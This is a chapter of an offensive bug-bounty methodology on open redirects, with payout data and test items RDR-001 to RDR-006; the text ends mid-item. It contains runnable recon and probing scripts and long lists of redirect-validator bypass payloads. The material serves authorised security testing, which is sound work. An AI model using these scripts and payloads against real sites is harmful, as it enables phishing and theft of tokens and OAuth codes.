# RDR · Open redirect

> The application sends the browser to a destination taken from the request (a parameter, the path, a header, or
> a value its own script reads from the URL) without keeping it on the application's hosts. Alone that is a
> phishing aid that most programmes rate low or exclude (`open-redirect`). It pays when the redirect carries
> something with it: a `javascript:` destination that runs in the origin, a token or OAuth code that leaves with
> the browser, a server-side fetcher that follows it inward, or a cache that serves it to every visitor.

| | |
|---|---|
| **Class** | `redirect` |
| **Applies when** | http |
| **Pays** | 362 disclosed reports filed under the class and 35 more that touch it; 70 paid, median $300, top $3,000. The best-paid ones made the redirect carry something: a `javascript:` destination that ran script (#125791, $3,000; #683298, $1,540; #260744, $1,120), a CSRF token or an OAuth code delivered off-site (#49759, $1,400; #3423013, $1,000), or a redirect bug in a framework, paid by the Internet Bug Bounty (#1865991, $2,400). |
| **Weaknesses** | Open Redirect · CWE-601 · Cross-site Scripting (XSS) - Generic · CWE-79 · Insufficiently Protected Credentials · CWE-522 · Improper Authentication - Generic · CWE-287 · Server-Side Request Forgery (SSRF) · CWE-918 |

## Why it pays

Every application redirects: the return URL after sign-in, the page after sign-out, the language switcher, the
outbound-link wrapper, the e-mail click tracker, the "continue" button after a warning. The check is code the
application wrote, and the browser, not the check, decides where the user lands. A check for a leading `/`, a
substring, a prefix or a regular expression is beaten by values the browser reads another way: `//host`,
`/\host`, `allowed@host`, a tab between the slashes, `http:host` with no slashes (#1513031, $300; #3599248 is
titled as a `/..//` bypass of a fix; #104087, $1,000, as making every fixed redirect vulnerable again). The same
bug lives in the path, where trailing-slash, locale and catch-all routes copy the request path into `Location`
(#469803, $1,200; #52035, $500), and in front-end code that assigns a URL parameter to `location`.

Standalone, the class is cheap. Of the 362 reports, 333 carry no severity rating, 18 are rated low, 9 medium and
2 high. Where programmes paid for a plain redirect it was $100 to $550 (#749338, #160047, #125003), and most
current policies list open redirects without impact as out of scope (`docs/07-graveyard.md`: phishing aid only).
The money is in what the redirect carries: script, when a `javascript:` destination reaches a link or a script
sink (#125791, $3,000; #683298, $1,540; #260744 and #330008, $1,120 each); a credential that rides along with
the browser, a CSRF token (#49759, $1,400; #50752, $560) or an OAuth code (#3423013, $1,000; #665651, $750;
#55525, $500); a server-side fetcher that trusts the target's own hosts and follows the redirect inward
(#771465, #287496); a cache that stores a redirect built from a header (#1795197). Framework redirect bugs
(#1865991, $2,400; #904059, $1,000) were paid upstream by the Internet Bug Bounty; on a target they belong to the
CVE chapter.

So the chapter has two halves. RDR-001 to RDR-005 find redirects and widen them past the validator. RDR-006 to
RDR-010 turn a redirect into something a triager pays for. On a programme that excludes open redirects the first
half still runs, its results are parked, and only a chain is reported.

## The crux question

**Which value decides where the browser goes next, what check stands between my value and that decision, and
what leaves with the browser when it goes: a script scheme, a token, a code, a server's request, a cached
response?**

## Applicability probe

The chapter gate (`http`) comes from the fingerprint. Settle `redirect-param` for the asset. The other items are
gated by `spa`, `cache`, `login`, `oauth-login`, `oauth-provider`, `url-fetch` and `default-page`, which the
fingerprint and the XSS, AUT, OAU and SSR probes settle; note them here if they are still unknown.

```bash
W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
# 1. destination-valued parameter names in the crawl, the proxy history and the archive (gau does not touch the host)
gau --providers wayback,commoncrawl "$H" > "$E/recon/$H/gau.txt" 2>/dev/null
grep -hoiE "[?&](next|url|uri|redir(ect)?[a-z_]*|return[a-z_]*|continue|dest(ination)?|goto|go|target|to|out|forward|back(_?url)?|checkout_url|success_url|cancel_url|callback_url|service|relaystate|r|u)=[^&\"' <>]{1,80}" \
  "$E/recon/$H/"*.txt | cut -d= -f1 | tr -d '?&' | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -25
# 2. the same names read by front-end code: a client-side redirect never shows up in the server's responses
grep -rhoE "(searchParams\.get|getParameter|getQueryParam|query\.|params\.)\(?['\"]?(next|redirect[A-Za-z_]*|return[A-Za-z_]*|continue|url|dest|goto|target)\b" \
  "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -15
# 3. do sign-in and sign-out take one? Signed out, so no session is spent
for p in "/login?next=%2Frdrprobe" "/signin?return_to=%2Frdrprobe" "/logout?redirect=%2Frdrprobe" "/users/sign_in?redirect_to=%2Frdrprobe"; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %header{location} $p\n" "$T$p"; sleep "$W"; done
```

While walking the application, note the outbound-link wrapper on user content, "you are leaving" pages, language
and currency switchers, unsubscribe and click-tracking links, and the hand-offs between the programme's own
hosts after sign-in.

```bash
scripts/sane fact set "$H" redirect-param=1 --ev "login?next=%2Frdrprobe answers Location: /rdrprobe; /out?url= wraps outbound links; app.js reads searchParams.get('redirect') after sign-in"
# nothing found after the sweep and the walk:
scripts/sane fact set "$H" redirect-param=0 --ev "no destination-valued parameter in crawl, archive or bundles; sign-in and sign-out ignore next, return_to, redirect and continue"
```

With `redirect-param` false the parameter items close for the asset. RDR-003 (the path) and RDR-010 (headers
behind a cache) need no parameter and stay queued per host name; RDR-005 and RDR-006 stay while `spa` is true. A
host that answers no HTTP at all closes the chapter through the fingerprint (`http=0`).

## Triage order

RDR-001 (the parameters the probe listed, one request each) → RDR-003 (twenty path requests per host name, no
parameter needed) → RDR-005 (a bundle grep, then a few browser loads) → RDR-006 (the script scheme on every
endpoint found: the cheapest way to Medium) → RDR-002 (bypasses, only where a validator refused RDR-001) →
RDR-004 (the sign-in and sign-out flows, with an account) → RDR-007 (hand-offs that carry a token: the highest
ceiling) → RDR-008 (OAuth codes through the forwarders found) → RDR-009 (only where a fetcher trusts the
target's hosts) → RDR-010 (per host name behind a cache).

## Items

### RDR-001 · A redirect parameter sends the browser to an external host written in its value, with no check

| | |
|---|---|
| **Severity** | Low standalone, None where the policy lists `open-redirect` (park it); Medium to High as the first link of RDR-006, RDR-007, RDR-008 or RDR-009 |
| **Requires** | redirect-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #749338, #125003, #160047, #1217570 |

- **Where:** every (path, parameter) pair whose name says "destination", from the crawl, the proxy history and
  the archive: `next`, `url`, `redirect`, `redirect_uri`, `return_to`, `returnUrl`, `continue`, `dest`, `goto`,
  `target`, `to`, `out`, `r`, `u`, `back_url`, `checkout_url`, `success_url`, `cancel_url`, `service`. Their
  usual owners are outbound-link wrappers (`/out`, `/away`, `/exit`, `/r`), click trackers, language and
  currency switchers, "unsupported browser" and error pages with a continue link, unsubscribe pages and payment
  returns. The output, `$E/evidence/$H/RDR-001/results.tsv`, is the redirect inventory the other items start
  from.
- **Test:** replace that one value with an absolute URL on a host we name and read `Location` without following
  it. A 30x to our host from an otherwise unchanged link is an open redirect. A refusal (a 400, the home page, or
  `Location` rewritten to a same-site path) means a validator exists: RDR-002 works on it.
- **How:**
  ```bash
  D="$E/evidence/$H/RDR-001"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  cat > "$D/cands.py" <<'PY'
  # URLs on stdin -> "<parameter> <url>", once per (path, parameter) whose name says "destination"
  import re, sys, urllib.parse as up
  N = re.compile(r"^(next|url|uri|redir(ect)?(_?(ur[il]|to))?|return(_?(to|url|path))?|returnurl|continue|dest(ination)?|go(to)?"
                 r"|target|to|out|forward|back(_?url)?|checkout_url|success_url|cancel_url|callback_url|service|relaystate|r|u)$", re.I)
  seen = set()
  for line in sys.stdin:
      s = up.urlsplit(line.strip())
      for k, _ in up.parse_qsl(s.query, keep_blank_values=True):
          if N.match(k) and (s.path, k) not in seen:
              seen.add((s.path, k)); print(k, up.urlunsplit(s))
  PY
  cat > "$D/swap.py" <<'PY'
  # swap.py <url> <parameter> <value>: the same URL with that one parameter's value replaced
  import sys, urllib.parse as up
  u, name, value = sys.argv[1:4]; s = up.urlsplit(u)
  print(up.urlunsplit(s._replace(query=up.urlencode([(k, value if k == name else v) for k, v in up.parse_qsl(s.query, keep_blank_values=True)]))))
  PY
  grep -ohE "https?://$H/[^\"' <>]+" "$E/recon/$H/"*.txt | python3 "$D/cands.py" > "$D/candidates.txt"; wc -l < "$D/candidates.txt"
  while read -r k u; do
    v=$(python3 "$D/swap.py" "$u" "$k" "https://$X/rdr001")
    printf '%s\t%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "$v")" "$k" "$v"; sleep "$W"
  done < "$D/candidates.txt" > "$D/results.tsv"
  for p in redirect out go exit away leave link r l click track jump; do       # redirectors the crawl did not show
    v="$T/$p?url=https%3A%2F%2F$X%2Frdr001&to=https%3A%2F%2F$X%2Frdr001&u=https%3A%2F%2F$X%2Frdr001"
    printf '%s\t%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "$v")" "url,to,u" "$v"; sleep "$W"
  done >> "$D/results.tsv"
  awk -F'\t' -v x="$X" '$1 ~ /^30/ && index($2, x)' "$D/results.tsv"           # the hits
  ```
  Open each hit once in the scriptable browser, or follow it with `curl -L` when `$X` is `$OOB`: it must land on
  `$X`.
- **Proof:** the link, the raw 30x with `Location: https://$X/rdr001` (saved with `curl -sS -D-`), the same
  request with the original value as the control, and the arrival on `$X` (a screenshot, or the `$OOB` log
  line). Where the policy lists open redirects this is a parked primitive, reported only as a link of a chain.
- **Not a finding when:** `Location` names `$X` only inside a same-site URL (`/login?next=https://$X/rdr001`):
  nothing has left yet; follow that hop, which is RDR-004's case. The value became a path on the same host
  (`Location: https://$H/https://$X/rdr001`). The link is signed (`url=…&sig=…`) and a changed value is
  refused; try once with the signature parameter removed before writing negative. A 200 page names the
  destination and waits for a click: a warned link is the design, and RDR-002 looks for a value that skips the
  warning. The destination is another of the programme's hosts. The redirector is an e-mail provider's click
  tracker or a link shortener on a programme sub-domain (`third-party`).
- **Escalate:** RDR-006 on every endpoint found: the same parameter with a script scheme is the cheapest Medium.
  RDR-008 when this host is inside an OAuth client's redirect space, RDR-007 when the endpoint is part of a
  sign-in hand-off, RDR-009 when a server-side fetcher trusts this host. A refused value goes to RDR-002. A
  `%0d%0a` in the value that reaches the `Location` header belongs to the CRL chapter.

### RDR-002 · The redirect allow-list accepts a value that the browser resolves to a host outside it

| | |
|---|---|
| **Severity** | Low standalone, as RDR-001 (None where `open-redirect` is excluded); Medium to High as the link that lets RDR-006, RDR-007, RDR-008 or RDR-009 through when the plain value is refused |
| **Requires** | redirect-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #104087, #1032610, #1513031, #3599248 |

- **Where:** the endpoints in `$E/evidence/$H/RDR-001/results.tsv` that refused `https://$X/` but accepted a
  same-site path or the programme's own URL. The link wrappers on user content that send allow-listed domains
  straight through and show a warning for the rest: a value the wrapper classes as allowed skips the warning
  (#541862, #28865, #1032610). Every redirect fix the programme has disclosed: the fixed parameter is the first
  place to try a bypass (#1285081 and #504509 are titled as fix bypasses).
- **Test:** read what the check looks at from the control lines (a path accepted, the programme's URL accepted,
  a foreign URL refused), then send the values that beat each kind of check. The browser decides the
  destination, so each `Location` is resolved with the WHATWG URL parser, the one Chrome, Firefox and Node's
  `URL` class implement, and the hits are opened in a browser. Kinds of check and what beats them:
  - starts with `/`: `//host`, `/\host`, `\/host`, `/%09/host` (the browser deletes the tab), `///host`, and
    `/..//host` or `/.//host` when the server normalises the path before writing it;
  - contains or starts with the allowed name: `allowed.host`, `allowed@host`, `allowed:443@host`,
    `allowed&@host`, `host/allowed`, `host?allowed`, `host#allowed`;
  - a server-side parser that splits the authority unlike the browser: `host\@allowed`, `host\.allowed`,
    `host#@allowed`, `host?@allowed`, and `host%2523@allowed` when the value is decoded twice;
  - looks for `//` after the scheme: `http:host`, `http:/host` (a scheme other than the page's own makes the
    browser read an authority), `https:\\host`;
  - a case-sensitive scheme deny-list: `HtTpS://host`; IDN folding: `allowed。host` (U+3002 becomes a dot);
  - an ends-with check: `<anything>allowed.tld`; a duplicated parameter read once by the check and once by the
    redirect.
- **How:**
  ```bash
  P=next; Q="$T/login?$P="; OK="$H"     # the parameter, the endpoint up to the value, the host or domain the check accepts
  D="$E/evidence/$H/RDR-002"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # sent exactly as written, percent-encoded the way a link carries it; the rdr002$OK line is read by eye (ends-with check)
  cat > "$D/values.txt" <<EOF
  %2Frdr002-control
  https%3A%2F%2F$OK%2Frdr002-control
  https%3A%2F%2F$X%2Frdr002-plain
  %2F%2F$X%2Frdr002
  %2F%5C$X%2Frdr002
  %5C%2F$X%2Frdr002
  %5C%5C$X%2Frdr002
  %2F%09%2F$X%2Frdr002
  %09%2F%2F$X%2Frdr002
  %2F%2F%2F$X%2Frdr002
  %2F.%2F%2F$X%2Frdr002
  %2F..%2F%2F$X%2Frdr002
  %252F%252F$X%2Frdr002
  http%3A$X%2Frdr002
  http%3A%2F$X%2Frdr002
  https%3A%5C%5C$X%2Frdr002
  https%3A%2F%5C$X%2Frdr002
  HtTpS%3A%2F%2F$X%2Frdr002
  https%3A%2F%2F$OK.$X%2Frdr002
  https%3A%2F%2F$OK%E3%80%82$X%2Frdr002
  https%3A%2F%2F$OK%40$X%2Frdr002
  https%3A%2F%2F$OK%3A443%40$X%2Frdr002
  https%3A%2F%2F$OK%26%40$X%2Frdr002
  https%3A%2F%2F$X%2F$OK
  https%3A%2F%2F$X%2F%3F$OK
  https%3A%2F%2F$X%2F%23$OK
  https%3A%2F%2F$X%3F.$OK
  https%3A%2F%2F$X%5C%40$OK%2F
  https%3A%2F%2F$X%5C.$OK%2F
  https%3A%2F%2F$X%23%40$OK%2F
  https%3A%2F%2F$X%2523%40$OK%2F
  https%3A%2F%2F$X%3F%40$OK%2F
  https%3A%2F%2Frdr002$OK%2F
  EOF
  # fields are separated by \x1f, not a tab: a bypass can put a raw tab into Location itself
  rq(){ r=$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}' "$Q$1"); printf '%s\x1f%s\x1f%s\n' "${r%% *}" "${r#* }" "$1"; sleep "$W"; }
  while IFS= read -r v; do rq "$v"; done < "$D/values.txt" > "$D/results.txt"
  rq "%2Frdr002&$P=https%3A%2F%2F$X%2Frdr002-hpp1" >> "$D/results.txt"      # duplicated parameter, both orders
  rq "https%3A%2F%2F$X%2Frdr002-hpp2&$P=%2Frdr002" >> "$D/results.txt"
  # where a browser goes for each Location: Node's URL class is the WHATWG parser, no request is sent
  node -e '
  const fs = require("fs"), [f, b, x] = process.argv.slice(1);
  for (const line of fs.readFileSync(f, "utf8").split("\n").filter(Boolean)) {
    const [code, loc, v] = line.split("\x1f"); let h = "-";
    if (loc) try { h = new URL(loc, b).hostname } catch (e) { h = "(unparsable)" }
    console.log((h === x || h.endsWith("." + x) ? "HIT " : "    ") + code + " " + h.padEnd(40) + " " + v);
  }' "$D/results.txt" "$Q" "$X" | tee "$D/verdict.txt" | grep '^HIT'
  ```
  Open each `HIT` value in the scriptable browser as the victim would receive it (`"$Q<value>"`) and keep the
  ones that land on `$X`.
- **Proof:** the winning value's request and raw 30x, its `verdict.txt` line, the browser landing on `$X`, and
  the control lines that show the plain `https://$X/` refused. For a link wrapper, its warning page for the
  plain value next to the instant redirect for the crafted one.
- **Not a finding when:** the `Location` reaches our host only in curl's reading: curl does not turn `\` into
  `/` or fold `。` into a dot, the browser does, and the WHATWG verdict and the browser run decide. The crafted
  value lands on a host we would have to register to look like the target (an ends-with check, a homoglyph):
  report the accepted `Location` and do not register look-alike domains. The browser stops on the wrapper's
  warning page: the check held. Every value lands on the same default page: the server parses the URL with a
  real parser and compares hosts, which is the correct design; write that as the mechanism.
- **Escalate:** reuse the winning value unchanged in RDR-006, RDR-007, RDR-008 and RDR-009: the same helper
  often guards the sign-in return, the OAuth forwarder and the fetcher's allow-list. A bypass of a fix the
  programme disclosed is new work, not a duplicate: name the report it bypasses.

### RDR-003 · A request path that starts with a double slash, a backslash or a URL is redirected by the server to another host

| | |
|---|---|
| **Severity** | Low standalone (None where `open-redirect` is excluded); High with RDR-008, because a path-based redirect usually keeps the query string and so forwards an OAuth code |
| **Requires** | !default-page |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #469803, #52035, #380760, #1581258 |

- **Where:** every host name, whatever it serves: the root, directories that answer 301 to add a trailing slash,
  locale prefixes (`/en/`), routes that strip or add a slash, HTTP-to-HTTPS upgrades on port 80, hosts that only
  redirect (`redirect-only`: they paste the path after a new host; #380760 is described as unexpected input in a
  sub-directory of such a host), static hosts, and catch-all routes that send unknown paths somewhere (#1581258).
  The gate is only `!default-page` because no parameter and no application logic is needed: a host that answers
  the same default page everywhere issues no redirect to abuse.
- **Test:** the server or its front end copies the request path into `Location`. A path that starts with
  `//host`, `/\host` or `/%5Chost` becomes a protocol-relative URL; a path that is a URL (`/https://host`) feeds a
  route that redirects to it (#469803); a path pasted after a host name without a slash (`/@host`, `/.host`)
  changes the host (`https://new.example.com@host`). A directory-slash redirect needs the path to resolve to a
  directory, which `//host/%2e%2e%2f` and `//host/%2e%2e%2f<dir>` provide.
- **How:**
  ```bash
  D="$E/evidence/$H/RDR-003"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # a real directory from the crawl gives a directory-slash redirect something to act on
  DIR=$(grep -ohE "https?://$H/[A-Za-z0-9_-]+/" "$E/recon/$H/"*.txt | awk -F/ '{print $4}' | sort | uniq -c | sort -rn | awk 'NR==1{print $2}')
  # fields are separated by \x1f, not a tab: a decoded %09 can put a raw tab into Location itself
  rq(){ r=$(curl -sS -g --path-as-is "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}' "$1"); printf '%s\x1f%s\x1f%s\n' "${r%% *}" "${r#* }" "$1"; sleep "$W"; }
  for p in "//$X/" "//$X/%2e%2e%2f" "//$X/%2e%2e%2f$DIR" "/%2F$X/" "/%2F%2F$X/" "/%5C$X/" "/%5C%5C$X/" "/%09/$X/" \
           "///$X/" "////$X/" "/https:/$X/" "/https://$X/" "/https:%2F%2F$X/" "/@$X/" "/;@$X/" "///;@$X/" "/.$X/" \
           "/$DIR//$X/" "/$DIR/%2F%2F$X/" "/$DIR/%5C$X/" "/$DIR/..%2F%2F$X/"; do
    rq "$T$p"
  done > "$D/results.txt"
  rq "http://$H//$X/" >> "$D/results.txt"           # the port-80 upgrade often copies the raw path
  # where the browser goes for each Location, and whether a browser would send that path unchanged at all
  node -e '
  const fs = require("fs"), [f, x] = process.argv.slice(1);
  for (const line of fs.readFileSync(f, "utf8").split("\n").filter(Boolean)) {
    const [code, loc, req] = line.split("\x1f"); let h = "-";
    if (loc) try { h = new URL(loc, req).hostname } catch (e) { h = "(unparsable)" }
    const u = new URL(req), asked = req.replace(/^https?:\/\/[^/]+/, ""), sent = u.pathname + u.search;
    console.log((h === x || h.endsWith("." + x) ? "HIT " : "    ") + code + " " + h.padEnd(30) + " " + req + (sent === asked ? "" : "  [browser sends " + sent + "]"));
  }' "$D/results.txt" "$X" | tee "$D/verdict.txt" | grep '^HIT'
  ```
- **Proof:** the link exactly as a browser sends it (its verdict line has no `[browser sends …]` note), the raw
  30x whose `Location` resolves to `$X`, and the landing in a browser.
- **Not a finding when:** the hit appears only from curl: browsers drop `/./`, `/../`, `/%2e/` and `/%2e%2e/`
  segments and turn `\` into `/` before sending, so a victim's link never carries them; the verdict marks those
  lines `[browser sends …]`, and only a marked line that still hits with the browser's path counts. `Location`
  keeps the host (`https://$H//$X/`): the rest is only a path. A redirect-only host sends us to its real target
  with our path attached (`https://www.example.com//$X/`). The behaviour is a hosting platform's own redirect
  logic on a CNAME (`third-party`); redirect rules the programme configured on its own CDN are its own.
- **Escalate:** a path-based redirector keeps the query string, which makes it the best forwarder for an OAuth
  code: RDR-008. A server-side fetcher that trusts this host follows it, and a fetcher does not normalise paths
  like a browser, so the curl-only forms work there: RDR-009. A static-file handler with a published redirect
  advisory (#1354255 is titled as one in `fastify-static`) goes to the CVE chapter for the version check.

### RDR-004 · After sign-in, sign-out or sign-up the application sends the user to an external return URL taken from the request

| | |
|---|---|
| **Severity** | Low standalone (None where `open-redirect` is excluded); High with RDR-007 when the same flow appends a token to the return URL |
| **Requires** | login, redirect-param, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #55546, #16718, #1788006, #2263044 |

- **Where:** return values in the authentication flows: the query of the sign-in, sign-out and sign-up pages
  (`next`, `return_to`, `redirect`, `continue`), a hidden field in the sign-in form, the JSON body of an API
  sign-in, a cookie or session value set when the sign-in page is opened (`return_to`, `redirect_after_login`),
  SAML `RelayState` (#2263044), a return path encoded in an OAuth or OIDC `state` (often base64 JSON), CAS
  `service=`, the links in verification and invitation e-mails, the second-factor step, account switching and
  "disconnect this account" pages.
- **Test:** each step is checked by its own code, and the hop after authentication often reads the stored value
  with no check at all. Three cases: already signed in, the sign-in page forwards at once; signed out, a value
  given before sign-in is honoured after it; sign-out forwards to the value. A stands in for the victim: open the
  link, sign in normally, land on our host.
- **How:**
  ```bash
  L="$T/login"; O="$T/logout"; N=next               # sign-in and sign-out routes and their return parameter (probe step 3)
  D="$E/evidence/$H/RDR-004"; mkdir -p "$D"; X="${OOB:-example.org}"; J="$D/jar"; rm -f "$J"
  # 1. already signed in: the sign-in page often forwards at once, through a shortcut the validator never sees
  curl -sS "${HDR[@]}" $A -o /dev/null -w "signed-in shortcut  %{http_code} %header{location}\n" --get --data-urlencode "$N=https://$X/rdr004a" "$L"
  # 2. signed out: open sign-in with the value (it may be kept in a cookie or the session), then sign in as A in the same jar
  curl -sS "${HDR[@]}" -c "$J" -b "$J" -o "$D/login.html" --get --data-urlencode "$N=https://$X/rdr004b" "$L"
  grep -aoiE '<(form|input)[^>]*>' "$D/login.html" | grep -iE 'action|hidden|next|return|redirect|csrf|token' | tee "$D/form.txt"
  grep -iE 'return|redirect|next' "$J"              # a stored return value shows up as a cookie
  CS=$(grep -iE 'csrf|authenticity_token|_token' "$D/form.txt" | grep -oE 'value="[^"]*"' | head -1 | cut -d'"' -f2)
  # use the form's own field names from form.txt; add the return field as well when the form carries it as a hidden input
  curl -sS "${HDR[@]}" -c "$J" -b "$J" -o /dev/null -w "after sign-in       %{http_code} %header{location}\n" -X POST "$L" \
    --data-urlencode 'email=<A e-mail>' --data-urlencode 'password=<A password>' --data-urlencode "csrf_token=$CS"
  # 3. sign-out with that throwaway session, never with A.headers: sign-out ends the session it is given
  curl -sS "${HDR[@]}" -b "$J" -o /dev/null -w "after sign-out      %{http_code} %header{location}\n" --get --data-urlencode "$N=https://$X/rdr004c" "$O"
  ```
  A refused value gets RDR-002's values in the same three requests. A sign-in answered with JSON navigates in
  the page: read the URL the JSON returns (`redirect`, `location`, `next`) and load the flow with RDR-005's
  browser run. For SSO, put the value in `RelayState`, or in the return path inside `state`, on the request that
  starts SSO, and finish the sign-in as A in the browser.
- **Proof:** the three result lines; for the sign-in case, the link we would send, A's genuine sign-in, and the
  `Location` (or the browser) that ends on `$X`, saved raw with `-D`.
- **Not a finding when:** external values land on the dashboard while internal paths are honoured: validated
  (RDR-002 first, then negative). The return value is honoured only from a POST field that a cross-site page
  cannot set without the victim's CSRF token, so no link carries it. Planting the stored value needs the victim
  signed into our account first (login CSRF, `csrf-low`). The redirect after SSO is performed by a third-party
  identity provider (`third-party`). A sign-out redirect to another host is a plain open redirect
  (`open-redirect`), and forcing the sign-out is `csrf-low`.
- **Escalate:** RDR-007: read the post-sign-in `Location` for an appended token. RDR-006 with a script scheme in
  the same value, because the post-sign-in navigation is often done by script. A sign-out-then-sign-in chain
  (`/logout?next=/login%3Fnext%3D…`) makes the victim type the password into the real page before landing on
  ours (#1788006 is titled as both together); describe that flow in the report.

### RDR-005 · The page itself redirects to a URL taken from the query or the fragment, through a meta refresh, a Refresh header or script

| | |
|---|---|
| **Severity** | Low standalone (None where `open-redirect` is excluded); Medium with RDR-006 at the same sink |
| **Requires** | redirect-param\|spa, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #958864, #437142 |

- **Where:** pages that answer 200 and then navigate: interstitials with a countdown,
  `<meta http-equiv="refresh" content="0;url=…">`, a `Refresh: 0; url=…` header, and front-end code that hands a
  value from `location.search`, `location.hash`, `document.referrer` or storage to `location`, `location.assign`,
  `location.replace`, `window.open`, `top.location` or a router after sign-in (`/login?redirect=` in a
  single-page application; #958864 is a DOM-based one on a sign-in form). Next.js's router sends an external URL
  to a full page navigation, other routers treat it as a path or throw: test, do not assume.
- **Test:** the server-side check, where there is one, guards the 30x path. The page's own redirect reads the
  raw parameter, or a fragment the server never receives, and navigates with a weaker check or none
  (`startsWith('/')`, `indexOf(location.host)`, `endsWith('example.com')`). Find the sink, load the URL in the
  browser, and see where it ends.
- **How:**
  ```bash
  D="$E/evidence/$H/RDR-005"; mkdir -p "$D"; X="${OOB:-example.org}"
  # 1. navigation sinks in the bundles fed from the URL (a value in location.hash never reaches the server or its check)
  grep -rnoE '.{0,100}(location(\.href)?\s*=[^=]|location\.(assign|replace)\(|window\.open\(|top\.location|\.navigate(ByUrl)?\(|router\.(push|replace)\()[^;]{0,100}' \
    "$E/recon/$H/js/" | grep -iE 'search|hash|param|query|get\(|next|return|redirect|continue|dest|url' | cut -c1-260 | sort -u | head -40 | tee "$D/sinks.txt"
  # 2. refreshes the server writes: the value inside a Refresh header or a meta refresh
  U="$T/redirect?url=https%3A%2F%2F$X%2Frdr005"     # each inventory endpoint that answered 200 instead of 30x
  curl -sS -g "${HDR[@]}" -D "$D/page.hdr" -o "$D/page.html" "$U"
  grep -i '^refresh:' "$D/page.hdr"; grep -aoiE '<meta[^>]*http-equiv=.?refresh[^>]*>' "$D/page.html"
  grep -aoiE '.{0,60}(location(\.href)?\s*=|location\.(assign|replace)\()[^;]{0,100}' "$D/page.html" | head -5
  # 3. the browser decides: load the query and fragment forms and record where each one ends
  cat > "$D/nav.js" <<'JS'
  // nav.js <evidence dir> <url> [<url> ...] -- <the HDR arguments>: load each URL, wait for refreshes and timers, print where it ended
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const a = process.argv.slice(2), i = a.indexOf('--'), dir = a[0], urls = a.slice(1, i < 0 ? a.length : i), h = i < 0 ? [] : a.slice(i + 1), hd = {}; let ua;
    for (let k = 0; k + 1 < h.length; k += 2) h[k] === '-A' ? ua = h[k + 1] : hd[h[k + 1].split(':')[0]] = h[k + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch();
    for (const u of urls) {
      const c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage(), hops = [];
      p.on('framenavigated', f => { if (f === p.mainFrame()) hops.push(f.url()); });
      await p.goto(u, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
      await p.waitForTimeout(6000);
      const line = `${new URL(p.url()).host}\t${hops.join(' -> ')}\t${u}\n`;
      fs.appendFileSync(`${dir}/nav.tsv`, line); process.stdout.write(line);
      await p.screenshot({ path: `${dir}/nav-${Date.now()}.png` }).catch(() => {}); await c.close();
    }
    await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/nav.js" "$D" "$U" "$T/login?redirect=https://$X/rdr005q" "$T/#/login?redirect=https://$X/rdr005h" \
    "$T/#https://$X/rdr005h" -- "${HDR[@]}"
  awk -F'\t' -v x="$X" 'index($1, x)' "$D/nav.tsv"     # the hits
  ```
  Replace the example URLs with the parameters and fragment routes that `sinks.txt` and the inventory name; a
  sink behind a weak check gets RDR-002's values in the same run.
- **Proof:** the `nav.tsv` line (start URL, the chain of navigations, final host `$X`), its screenshot, and the
  sink: the bundle line from `sinks.txt`, or the meta tag or `Refresh` header. For a fragment sink, state that the
  value never reaches the server, so no server-side check or WAF sees it.
- **Not a finding when:** the page shows a link and waits for a click instead of navigating: a warned link. The
  value reaches the sink only from our own session, or from a `postMessage` the page accepts only from its own
  origin. The code parses the value with `new URL(v, location.origin)` and compares origins before navigating:
  the correct design, and RDR-002's values all stay on the site. The navigation happens inside a frame the page
  embeds, not in the top window, so the address bar never changes: record it for RDR-006 and nothing more.
- **Escalate:** RDR-006 at the same sink: script sinks that navigate also run `javascript:`. A fragment-reading
  redirect inside an OAuth redirect space forwards an implicit-flow token: RDR-008 and OAU-003. A sink fed by
  `postMessage` belongs to the CSD chapter. A headless renderer behind a server-side fetcher follows this
  redirect too: RDR-009.

### RDR-006 · A redirect performed by a link or by script accepts a javascript: destination, which runs in the target's origin

| | |
|---|---|
| **Severity** | Medium standalone (script in the application origin after one click or none); High with XSS-018 on an origin that holds the session |
| **Requires** | redirect-param\|spa, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #125791, #330008, #140447, #1178239 |

- **Where:** the redirects in the inventory (RDR-001 to RDR-005) whose navigation is not a bare 30x: pages that
  render the destination as a "continue" link or a form action, script sinks that assign it to `location` or
  `window.open`, sign-in popups that close with `window.opener.location = next`, and redirect helpers that fall
  back to an HTML page when the value is not an HTTP URL. XSS-004 is the same test started from the XSS side;
  when it has already run on this endpoint, copy its outcome here with a note instead of testing twice.
- **Test:** redirect checks are written against foreign hosts, not schemes. A deny-list for `http://`, `https://`
  and `//` treats `javascript:` as a relative path. A host check is satisfied by `javascript://allowed.host/%0a…`:
